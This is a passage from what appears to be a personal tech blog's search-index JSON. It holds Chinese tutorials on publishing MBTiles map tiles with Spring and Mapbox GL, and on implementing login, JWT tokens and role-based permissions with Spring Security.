@PathVariable int z, @ApiParam(name = \u0026#34;x\u0026#34;, value = \u0026#34;tile_column\u0026#34;) @PathVariable int x, @ApiParam(name = \u0026#34;y\u0026#34;, value = \u0026#34;tile_row\u0026#34;) @PathVariable int y , HttpServletResponse response){ TilesDTO tilesDTO = new TilesDTO(); tilesDTO.setTile_column(x); tilesDTO.setTile_row((int)(Math.pow(2,z)-1-y)); tilesDTO.setZoom_level(z); tilesService.getMapboxTiles(tilesDTO, response); } 5.mapbox加载地图服务 5.1 html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Add a vector tile source\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;initial-scale=1,maximum-scale=1,user-scalable=no\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v2.8.2/mapbox-gl.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v2.8.2/mapbox-gl.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; body { margin: 0; padding: 0; } #map { position: absolute; top: 0; bottom: 0; width: 100%; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;map\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; mapboxgl.accessToken = \u0026#39;pk.eyJ...e2_rdU2nOUvtwltBIZtZg\u0026#39;; const map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#39;mapbox://styles/mapbox/light-v10\u0026#39;, zoom: 5, center: [118.447303, 30.753574] }); map.on(\u0026#34;load\u0026#34;, () =\u0026gt; { map.addSource(\u0026#34;testMapLine\u0026#34;, { type: \u0026#34;vector\u0026#34;, tiles: [\u0026#34;http://localhost:9000/tiles/mapbox/{z}/{x}/{y}.pbf }); map.addLayer({ id: \u0026#34;testMapLineLayer\u0026#34;, type: \u0026#34;fill\u0026#34;, source: \u0026#34;testMapLine\u0026#34;, // ST_AsMVT() uses \u0026#39;default\u0026#39; as layer name \u0026#34;source-layer\u0026#34;: \u0026#34;water\u0026#34;, \u0026#34;filter\u0026#34;: [\u0026#34;all\u0026#34;, [\u0026#34;!=\u0026#34;, \u0026#34;brunnel\u0026#34;, \u0026#34;tunnel\u0026#34;]], minzoom: 0, maxzoom: 22, \u0026#34;paint\u0026#34;: { \u0026#34;fill-color\u0026#34;: \u0026#34;rgb(158,189,255)\u0026#34;, \u0026#34;fill-opacity\u0026#34;: [\u0026#34;literal\u0026#34;, 1] } }); }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 5.2 效果展示 可以看到水体被加载出来了\n6.发布osm-liberty形式的地图服务 mapbox还有一种直接请求osm-liberty.json的方式加载地图服务\n6.1 地图服务接口 接口层\n1 2 3 4 5 @ApiOperation(value = \u0026#34;得到mapbox元数据json\u0026#34; ) @GetMapping(\u0026#34;/mapbox/liberty.json\u0026#34;) public JSONObject getMapboxLibertyJson(){ return tilesService.getMapboxLibertyJson(); } Service层\n首先加载原始的osm_liberty.json，将自定义tiles.json接口地址更新至osm_liberty.json中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public JSONObject getMapboxLibertyJson() { try { File file = ResourceUtils.getFile(resourcePath + \u0026#34;/osm_liberty.json\u0026#34;); Map map = FileUtils.readJson(file); JSONObject jsonObject = new JSONObject(map); String sourceUrl = \u0026#34;http://localhost:9000/tiles/mapbox/metadata/tiles.json\u0026#34;; ((Map)((Map) jsonObject.get(\u0026#34;sources\u0026#34;)).get(\u0026#34;openmaptiles\u0026#34;)).put(\u0026#34;url\u0026#34;, sourceUrl); return jsonObject; }catch (Exception e){ e.printStackTrace(); } return null; } tiles.json接口\n1 2 3 4 5 6 7 8 // \u0026#34;https://api.maptiler.com/tiles/v3/tiles.json?key=XAapkmkXQpx839NCfnxD\u0026#34; @ApiOperation(value = \u0026#34;得到mapbox元数据json\u0026#34; ) @GetMapping(\u0026#34;/mapbox/metadata/tiles.json\u0026#34;) public JSONObject getMapboxTilesMetadataJson(){ return tilesService.getMapboxTilesMetadataJson(); } getMapboxTilesMetadataJson方法中，可以看到我们用到了mbtiles中metadata表里面的数据，同时，tiles.json的tiles就是我们[4.3](# 4.3 接口编写)编写的接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 public JSONObject getMapboxTilesMetadataJson() { JSONObject result = new JSONObject(); try { Statement statement = mapboxConnection.createStatement(); // 得到结果集 String sql = \u0026#34;SELECT * FROM metadata\u0026#34;; ResultSet rs = statement.executeQuery(sql); while (rs.next()) { String name = (String) rs.getObject(\u0026#34;name\u0026#34;); String value = (String) rs.getObject(\u0026#34;value\u0026#34;); JSONObject jsonObject = formatMetadata(name, value); result.put(jsonObject.getString(\u0026#34;name\u0026#34;),jsonObject.get(\u0026#34;value\u0026#34;)); } rs.close(); //statement在每次执行之后都要关了 statement.close(); }catch (Exception e){ e.printStackTrace(); } result.put(\u0026#34;tiles\u0026#34;, Arrays.asList(\u0026#34;http://localhost:9000/tiles/mapbox/{z}/{x}/{y}.pbf\u0026#34;)); // result.put(\u0026#34;tiles\u0026#34;, Arrays.asList(\u0026#34;https://api.maptiler.com/tiles/v3/{z}/{x}/{y}.pbf?key=XAapkmkXQpx839NCfnxD\u0026#34;)); return result; } 6.2 mapbox加载osm-liberty.json 6.2.1 html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Add a vector tile source\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;initial-scale=1,maximum-scale=1,user-scalable=no\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v2.8.2/mapbox-gl.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v2.8.2/mapbox-gl.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; body { margin: 0; padding: 0; } #map { position: absolute; top: 0; bottom: 0; width: 100%; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;map\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; mapboxgl.accessToken = \u0026#39;pk.eyJ1Ijoid3lqcSIsImEiOiJjbDBnZDdwajUxMXRzM2htdWxubDh1MzJrIn0.2e2_rdU2nOUvtwltBIZtZg\u0026#39;; const map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#34;http://localhost:9000/tiles/mapbox/liberty.json\u0026#34;, zoom: 5, center: [118.447303, 30.753574] }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 6.2.2 效果展示 可以看到所有数据（边界轮廓等）都加载出来了\n","permalink":"https://chance7bin.github.io/posts/map/%E4%BD%BF%E7%94%A8mbtiles%E5%8F%91%E5%B8%83%E5%9C%B0%E5%9B%BE%E6%9C%8D%E5%8A%A1/","summary":"1.mbtiles简介 mapbox Docs : MBTiles MbTiles 是一种用于在 sqllite 数据库中存储任意瓦片地图数据用于即时使用和高效传输的规范。 MBTiles瓦片存储规范的制定主要","title":"使用mbtiles发布地图服务"},{"content":"0 引言 该篇文章是对Spring Security学习的总结，以及系统中认证授权的代码实现\n参考链接\nSpringSecurity-从入门到精通\n1 Spring Security Spring Security 是 Spring 家族中的一个安全管理框架。相比与另外一个安全框架Shiro，它提供了更丰富的功能，社区资源也比Shiro丰富。\n一般来说中大型的项目都是使用SpringSecurity 来做安全框架。小项目有Shiro的比较多，因为相比与SpringSecurity，Shiro的上手更加的简单。\n一般Web应用的需要进行认证和授权。\n认证：验证当前访问系统的是不是本系统的用户，并且要确认具体是哪个用户\n授权：经过认证后判断当前用户是否有权限进行某个操作\n而认证和授权也是SpringSecurity作为安全框架的核心功能。\n1.1 Spring Security原理初探 认证基本流程：\n根据username, password封装一个Authentication对象authenticationToken，并加入到SecurityContextHolder的context中 调用AuthenticationManager接口的authenticate(authenticationToken)方法进行认证 在第2步调用authenticate方法时，它实际会执行实现了UserDetailsService接口的loadUserByUsername方法，认证用户的逻辑就写在该方法中 在loadUserByUsername方法中，从AuthenticationContextHolder获取第一步传入的username, password，与数据库的密码做对比，验证用户密码是否正确，若正确，则把用户信息封装到实现了UserDetails接口的类中 步骤1扩展\n认证过滤器UsernamePasswordAuthenticationFilter：它的作用是拦截登录请求并获取账号和密码，然后把账号密码封装到认证凭据 UsernamePasswordAuthenticationToken 中，然后把凭据交 给特定配置的 AuthenticationManager去作认证。\n步骤2扩展\nAuthenticationManager 的实现 ProviderManager 管理了众多的 AuthenticationProvider 。每 一个 AuthenticationProvider都只支持特定类型的 Authentication ，然后是对适配到的 Authentication 进行认证，只要有一个 AuthenticationProvider认证成功，那么就认为认证成功，所有的都没有通过才认为是认证失败。认证成功后的 Authentication 就变成授信凭据，并触发认证成功的事件。认证失败的就抛出异常触发认证失败的事件。\n1.2 Spring Secutity核心内容 1.2.1 Spring Secutity中的用户信息 1.UserDetailsService：\n该方法很容易理解： 通过用户名来加载用户 。这个方法主要用于从系统数据中查询并加载具体的用户到 Spring Security中。\n在开发中我们一般定义一个这个接口的实现类，自定义loadUserByUsername方法，实现从数据源获取用户，加载用户信息。也可以在其中实现一些校验用户逻辑。\n2.UserDetails:\n从上面 UserDetailsService 可以知道最终交给Spring Security的是UserDetails 。该接口是提供用户信息的核心接口。该接口实现仅仅存储用户的信息。后续会将该接口提供的用户信息封装到认证对象Authentication 中去。\nUserDetails中默认提供：\n用户的权限集， 默认需要添加 ROLE_ 前缀 用户的加密后的密码， 不加密会使用 {noop} 前缀 应用内唯一的用户名 账户是否过期 账户是否锁定 凭证是否过期 用户是否可用 在我们自己的项目中，我们要定义个用户类实现该接口，在该用户类中我们可以扩展更多的用户信息，比如手机、邮箱等等\n1.2.2 Spring Security的配置 自定义SecurityConfig\n首先要继承WebSecurityConfigurerAdapter，其次最常用的是实现configure(AuthenticationManagerBuilder auth)、configure(WebSecurity web)、configure(HttpSecurity http)三个方法实现我们对Spring Security的自定义安全配置。\nvoid configure(AuthenticationManagerBuilder auth) 用来配置认证管理器 AuthenticationManager。 void configure(WebSecurity web)用来配置 WebSecurity 。而 WebSecurity是基于Servlet Filter用来配置 springSecurityFilterChain。而 springSecurityFilterChain 又被委托给了 Spring Security 核心过滤器 Bean DelegatingFilterProxy 。 相关逻辑可以在 WebSecurityConfiguration 中找到。我们一般不会过多来自定义 WebSecurity , 使用较多的使其 ignoring() 方法用来忽略 Spring Security 对静态资源的控制。 void configure(HttpSecurity http) 这个是我们使用最多的，用来配置 HttpSecurity 。 HttpSecurity用于构建一个安全过滤器链 SecurityFilterChain。 SecurityFilterChain 最终被注入核心过滤器 。HttpSecurity有许多我们需要的配置。我们可以通过它来进行自定义安全访问策略。 1.2.3 认证过程 详见 [1.1 Spring Security原理初探](# 1.1 Spring Security原理初探)\n1.2.4 过滤器和过滤链 SpringSecurity的原理其实就是一个过滤器链，内部包含了提供各种功能的过滤器。\nSpring Security 以一个单 Filter(FilterChainProxy)存在于整个过滤器链中，而 这个 FilterChainProxy 实际内部代理着众多的 Spring Security Filter 。\n图中只展示了核心过滤器，其它的非核心过滤器并没有在图中展示。\nUsernamePasswordAuthenticationFilter:负责处理我们在登陆页面填写了用户名密码后的登陆请求。入门案例的认证工作主要有它负责。\nExceptionTranslationFilter： 处理过滤器链中抛出的任何AccessDeniedException和AuthenticationException 。\nFilterSecurityInterceptor： 负责权限校验的过滤器。\n我们可以通过Debug查看当前系统中SpringSecurity过滤器链中有哪些过滤器及它们的顺序。\n向项目中添加过滤器：\n在配置文件的configure(HttpSecurity httpSecurity)方法中：\n4个方法分别是：addFilter–添加过滤器；addFilterAfter–把过滤器添加到某过滤器之后；addFilterAt–替代某过滤器；addFilterBefore–把过滤器添加到某过滤器之前\n1.2.5 权限相关 一、基于配置表达式控制 URL 路径\n在继承WebSecurityConfigurerAdapter的配置类中的configure(HttpSecurity http)中进行配置。\n1 2 3 4 5 6 7 8 protected void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .antMatchers(\u0026#34;/admin/**\u0026#34;).hasRole(\u0026#34;admin\u0026#34;) .antMatchers(\u0026#34;/user/**\u0026#34;).hasAnyRole(\u0026#34;admin\u0026#34;, \u0026#34;user\u0026#34;) .anyRequest().authenticated() .and() ... } 二、基于注解的接口权限控制\n我们可以在任何 @Configuration实例上使用 @EnableGlobalMethodSecurity注解来启用全局方 法安全注解功能\n1 2 3 4 5 6 @Configuration @EnableGlobalMethodSecurity(prePostEnabled = true,securedEnabled = true,jsr250Enabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { ... ... } 设置 prePostEnabled为 true ，则开启了基于表达式 的方法安全控制。 2 认证 2.1 登录校验流程 2.2 登录功能核心代码 在SpringBoot项目中使用SpringSecurity我们只需要引入依赖即可。\n1 2 3 4 5 \u0026lt;!-- spring security 安全认证 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 1.根据username, password封装一个Authentication对象authenticationToken，调用AuthenticationManager接口的authenticate(authenticationToken)方法进行认证\nAuthentication类中：principal属性对应用户名；credentials属性对应密码\n若是需要根据邮箱登录的话把email放到principal，\nloadUserByUsername方法的参数就是这个email\n在接口中我们通过AuthenticationManager的authenticate方法来进行用户认证，所以需要在SecurityConfig中配置把AuthenticationManager注入容器。\n1 2 3 4 5 6 7 8 9 10 public String login(String username, String password, String code, String uuid) { // 用户验证 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(username, password); AuthenticationContextHolder.setContext(authenticationToken); // 该方法会去调用UserDetailsServiceImpl.loadUserByUsername Authentication authentication = authenticationManager.authenticate(authenticationToken); // 生成token return tokenService.createToken(loginUser); } 密码加密存储\n实际项目中我们不会把密码明文存储在数据库中。\n一般使用SpringSecurity为我们提供的BCryptPasswordEncoder。\n我们只需要使用把BCryptPasswordEncoder对象注入Spring容器中，SpringSecurity就会使用该PasswordEncoder来进行密码校验\n部分SecurityConfig配置（[完整配置](# 2.4 配置SecurityConfig)）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 @Configuration public class SecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http //关闭csrf .csrf().disable() //不通过Session获取SecurityContext .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() // 对于登录接口 允许匿名访问 .antMatchers(\u0026#34;/user/login\u0026#34;).anonymous() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated(); } @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } /** * 强散列哈希加密实现 */ @Bean public BCryptPasswordEncoder bCryptPasswordEncoder() { return new BCryptPasswordEncoder(); } /** * 身份认证接口 */ @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 数据库验证 // Spring Security 提供了BCryptPasswordEncoder类, // 实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码 auth.userDetailsService(userDetailsService).passwordEncoder(bCryptPasswordEncoder()); } } 2.创建一个service，实现UserDetailsService接口，并重写loadUserByUsername方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @Service public class UserDetailsServiceImpl implements UserDetailsService{ @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { SysUser user = userService.selectUserByUserName(username); validate(user); return createLoginUser(user); } public UserDetails createLoginUser(SysUser user) { return new LoginUser(user.getUserId(), user); } } 3.实现密码验证逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public void validate(SysUser user){ Authentication usernamePasswordAuthenticationToken = AuthenticationContextHolder.getContext(); String username = usernamePasswordAuthenticationToken.getName(); String password = usernamePasswordAuthenticationToken.getCredentials().toString(); if (!matches(user, password)) { throw new ServiceException(\u0026#34;密码错误\u0026#34;); } } public boolean matches(SysUser user, String rawPassword){ return matchesPassword(rawPassword, user.getPassword()); } /** * 判断密码是否相同 * * @param rawPassword 真实密码 * @param encodedPassword 加密后字符 * @return 结果 */ public boolean matchesPassword(String rawPassword, String encodedPassword) { BCryptPasswordEncoder passwordEncoder = new BCryptPasswordEncoder(); return passwordEncoder.matches(rawPassword, encodedPassword); } 4.验证成功后，创建令牌，存入redis中，并将token返回给前端（实现步骤1中的createToken方法）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /** * 创建令牌 * * @param loginUser 用户信息 * @return 令牌 */ public String createToken(LoginUser loginUser) { String token = UUID.fastUUID().toString(); loginUser.setToken(token); refreshToken(loginUser); Map\u0026lt;String, Object\u0026gt; claims = new HashMap\u0026lt;\u0026gt;(); claims.put(Constants.LOGIN_USER_KEY, token); return createToken(claims); } /** * 刷新令牌有效期 * * @param loginUser 登录信息 */ public void refreshToken(LoginUser loginUser) { loginUser.setLoginTime(System.currentTimeMillis()); loginUser.setExpireTime(loginUser.getLoginTime() + expireTime * MILLIS_MINUTE); // 根据uuid将loginUser缓存 String userKey = getTokenKey(loginUser.getToken()); // \u0026#34;login_tokens:\u0026#34; + uuid; redisCache.set(userKey, loginUser, expireTime, TimeUnit.MINUTES); } /** * 从数据声明生成令牌 * * @param claims 数据声明 * @return 令牌 */ private String createToken(Map\u0026lt;String, Object\u0026gt; claims) { String token = Jwts.builder() .setClaims(claims) .signWith(SignatureAlgorithm.HS512, secret).compact(); return token; } 2.3 校验功能核心代码 访问系统资源时，如果每次都需要去数据库验证密码是十分消耗资源的，[2.2](# 2.2 登录功能核心代码)中，最后返回了一个token，可基于该token实现保存登录状态的功能\n1.前端将后端返回的token存入Cookie中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 login(userInfo) { const username = userInfo.username.trim(); const password = userInfo.password; return new Promise\u0026lt;void\u0026gt;((resolve, reject) =\u0026gt; { login(username, password) .then((res: any) =\u0026gt; { setToken(res.token); this.token = res.token; resolve(); }) .catch((error) =\u0026gt; { reject(error); }); }); } 1 2 3 4 5 6 import Cookies from \u0026#34;js-cookie\u0026#34;; const TokenKey = \u0026#34;Admin-Token\u0026#34;; export function setToken(token: string) { return Cookies.set(TokenKey, token); } 2.请求接口时都附上token，验证用户是否登录\nrequest.ts\n1 2 3 4 5 6 7 8 9 // request拦截器 service.interceptors.request.use( (config: any) =\u0026gt; { // 是否需要设置 token const isToken = (config.headers || {}).isToken === false; if (getToken() \u0026amp;\u0026amp; !isToken) { // 让每个请求携带自定义token 请根据实际情况自行修改 config.headers[\u0026#34;Authorization\u0026#34;] = \u0026#34;Bearer \u0026#34; + getToken(); } 3.定义Jwt认证过滤器 JwtAuthenticationTokenFilter，验证token有效性\n因为redis设置了登陆令牌的过期时间，所以如果令牌过期了，redis中就不存在token解析后的redisKey，会直接返回null，这种其概况就要重新登录了。\n添加依赖\n1 2 3 4 5 6 \u0026lt;!-- Token生成与解析--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.jsonwebtoken\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jjwt\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${jwt.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; JwtAuthenticationTokenFilter\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 /** * token过滤器 验证token有效性 * * @author 7bin */ @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { // 验证令牌有效期，相差不足20分钟，自动刷新缓存 tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 通过验证，在Spring Security上下文中写入用户登录相关所有信息 SecurityContextHolder.getContext().setAuthentication(authenticationToken); } chain.doFilter(request, response); } } 如何根据token获取登录用户信息\n核心：从request解析token获取其中的userId，到redis中根据userId获取用户信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 /** * 获取用户身份信息 * * @return 用户信息 */ public LoginUser getLoginUser(HttpServletRequest request) { // 获取请求携带的令牌 String token = getToken(request); if (StringUtils.isNotEmpty(token)) { try { Claims claims = parseToken(token); // 解析对应的权限以及用户信息 String uuid = (String) claims.get(Constants.LOGIN_USER_KEY); String userKey = getTokenKey(uuid); LoginUser user = redisCache.get(userKey); return user; } catch (Exception e) { log.error(e.getMessage()); } } return null; } /** * 令牌前缀 */ public static final String TOKEN_PREFIX = \u0026#34;Bearer \u0026#34;; /** * 获取请求token * * @param request * @return token */ private String getToken(HttpServletRequest request) { String token = request.getHeader(header); if (StringUtils.isNotEmpty(token) \u0026amp;\u0026amp; token.startsWith(Constants.TOKEN_PREFIX)) { token = token.replace(Constants.TOKEN_PREFIX, \u0026#34;\u0026#34;); } return token; } /** * 从令牌中获取数据声明 * * @param token 令牌 * @return 数据声明 */ private Claims parseToken(String token) { return Jwts.parser() .setSigningKey(secret) .parseClaimsJws(token) .getBody(); } 2.4 配置SecurityConfig 在SecurityConfig中注入：\nLogoutSuccessHandlerImpl 自定义实现的UserDetailsService JwtAuthenticationTokenFilter AuthenticationEntryPoint CorsFilter \u0026hellip; 以及相关权限控制configure\n完整spring security配置如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 /** * spring security配置 * * @author 7bin */ @EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { /** * 自定义用户认证逻辑 */ @Autowired private UserDetailsService userDetailsService; /** * 认证失败处理类（抛出AuthenticationException异常走这里） */ @Autowired private AuthenticationEntryPointImpl unauthorizedHandler; /** * 退出处理类 */ @Autowired private LogoutSuccessHandlerImpl logoutSuccessHandler; /** * token认证过滤器 */ @Autowired private JwtAuthenticationTokenFilter authenticationTokenFilter; /** * 跨域过滤器 */ @Autowired private CorsFilter corsFilter; /** * 允许匿名访问的地址 */ @Autowired private PermitAllUrlProperties permitAllUrl; /** * 解决 无法直接注入 AuthenticationManager * * @return * @throws Exception */ @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } /** * anyRequest | 匹配所有请求路径 * access | SpringEl表达式结果为true时可以访问 * anonymous | 匿名可以访问 * denyAll | 用户不能访问 * fullyAuthenticated | 用户完全认证可以访问（非remember-me下自动登录） * hasAnyAuthority | 如果有参数，参数表示权限，则其中任何一个权限可以访问 * hasAnyRole | 如果有参数，参数表示角色，则其中任何一个角色可以访问 * hasAuthority | 如果有参数，参数表示权限，则其权限可以访问 * hasIpAddress | 如果有参数，参数表示IP地址，如果用户IP和参数匹配，则可以访问 * hasRole | 如果有参数，参数表示角色，则其角色可以访问 * permitAll | 用户可以任意访问 * rememberMe | 允许通过remember-me登录的用户访问 * authenticated | 用户登录后可访问 */ @Override protected void configure(HttpSecurity httpSecurity) throws Exception { // 注解标记允许匿名访问的url ExpressionUrlAuthorizationConfigurer\u0026lt;HttpSecurity\u0026gt;.ExpressionInterceptUrlRegistry registry = httpSecurity.authorizeRequests(); permitAllUrl.getUrls().forEach(url -\u0026gt; registry.antMatchers(url).permitAll()); httpSecurity // CSRF禁用，因为不使用session // 关闭csrf功能:跨站请求伪造,默认只能通过post方式提交logout请求 .csrf().disable() // 认证失败处理类 .exceptionHandling().authenticationEntryPoint(unauthorizedHandler).and() // 基于token，所以不需要session .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS).and() // 过滤请求 .authorizeRequests() // anonymous() :匿名访问, 仅允许匿名用户访问, 如果登录认证后, 带有token信息再去请求, 这个anonymous()关联的资源就不能被访问， // permitAll() :登录能访问,不登录也能访问, 一般用于静态资源js等 // 对于登录login 注册register 验证码captchaImage 允许匿名访问 .antMatchers(\u0026#34;/login\u0026#34;, \u0026#34;/register\u0026#34;, \u0026#34;/captchaImage\u0026#34;,\u0026#34;/docker/**\u0026#34;).anonymous() // 静态资源，可匿名访问 .antMatchers(HttpMethod.GET, \u0026#34;/\u0026#34;, \u0026#34;/*.html\u0026#34;, \u0026#34;/**/*.html\u0026#34;, \u0026#34;/**/*.css\u0026#34;, \u0026#34;/**/*.js\u0026#34;, \u0026#34;/profile/**\u0026#34;).permitAll() .antMatchers(\u0026#34;/swagger-ui.html\u0026#34;, \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/*/api-docs\u0026#34;, \u0026#34;/druid/**\u0026#34;).permitAll() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated() .and() .headers().frameOptions().disable(); // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); // 添加JWT filter httpSecurity.addFilterBefore(authenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); // 添加CORS filter httpSecurity.addFilterBefore(corsFilter, JwtAuthenticationTokenFilter.class); httpSecurity.addFilterBefore(corsFilter, LogoutFilter.class); } /** * 强散列哈希加密实现 */ @Bean public BCryptPasswordEncoder bCryptPasswordEncoder() { return new BCryptPasswordEncoder(); } /** * 身份认证接口 */ @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 数据库验证 // Spring Security 提供了BCryptPasswordEncoder类, // 实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码 auth.userDetailsService(userDetailsService).passwordEncoder(bCryptPasswordEncoder()); } } 2.5 思考 什么时候会走到认证失败的处理类呢（还不知道）\nhttpSecurity.exceptionHandling().authenticationEntryPoint(unauthorizedHandler)\nAuthenticationException异常详解\n3 授权 3.1 RBAC权限模型 RBAC权限模型（Role-Based Access Control）即：基于角色的权限控制。这是目前最常被开发者使用也是相对易用、通用权限模型。\n3.1.1 数据库表结构 如下图是RBAC权限模型各表的基本属性\n当判断某个用户是否拥有某个权限的时候，可根据user_role表获取到该user关联的role，之后可根据role_menu表获取到该role能够访问的menu（权限）\n3.1.2 如何获取用户具有哪些权限？ 在用户登录的时候（loadUserByUsername方法中），将权限信息写入LoginUser中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { SysUser user = userService.selectUserByUserName(username); if (StringUtils.isNull(user)) { log.info(\u0026#34;登录用户：{} 不存在.\u0026#34;, username); throw new ServiceException(\u0026#34;登录用户：\u0026#34; + username + \u0026#34; 不存在\u0026#34;); } else if (UserStatus.DELETED.getCode().equals(user.getDelFlag())) { log.info(\u0026#34;登录用户：{} 已被删除.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已被删除\u0026#34;); } else if (UserStatus.DISABLE.getCode().equals(user.getStatus())) { log.info(\u0026#34;登录用户：{} 已被停用.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已停用\u0026#34;); } passwordService.validate(user); return createLoginUser(user); } public UserDetails createLoginUser(SysUser user) { return new LoginUser(user.getUserId(), user, permissionService.getMenuPermission(user)); } PermissionService\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 